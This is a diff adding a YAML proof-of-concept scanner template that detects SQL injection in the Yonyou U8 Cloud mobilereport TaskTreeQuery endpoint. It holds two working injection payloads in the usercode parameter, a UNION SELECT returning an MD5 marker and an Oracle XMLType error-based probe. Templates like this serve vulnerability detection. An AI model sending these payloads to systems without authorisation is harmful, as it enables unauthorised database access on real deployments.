@@ -1,0 +1,28 @@
+name: poc-yaml-yonyou-u8cloud-mobilereport-sqli
+transport: http
+set:
+  rInt0: randomInt(10000, 99999)
+  rInt1: randomInt(1000, 9999)
+  rInt2: randomInt(1000, 9999)
+rules:
+  r0:
+    request:
+      method: GET
+      path: >-
+        /service/~iufo/nc.itf.iufo.mobilereport.task.TaskTreeQuery?usercode=1%27union%20all%20select%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27{{rInt0}}%27))%20,2,3,4,5,6,7,8,9%20--
+      follow_redirects: false
+    expression: >-
+      response.status == 200 && response.body.bcontains(bytes(md5(string(rInt0))))
+  r1:
+    request:
+      method: GET
+      path: >-
+        /service/~iufo/nc.itf.iufo.mobilereport.task.TaskTreeQuery?usercode=1%27%20AND%20(SELECT%20XMLType(CHR(60)%7c%7cCHR(58)%7c%7c{{rInt1}}*{{rInt2}})%20FROM%20DUAL)%20IS%20NOT%20NULL%20--
+      follow_redirects: false
+    expression: >-
+      response.status == 200 && response.body.bcontains(bytes(string(rInt1 * rInt2)))
+expression: r0() || r1()
+detail:
+  author: 'agap0rn15'
+  links:
+    - 'https://stack.chaitin.com/vuldb/detail/ef558564-2125-47fd-a83d-13827ca40afe'
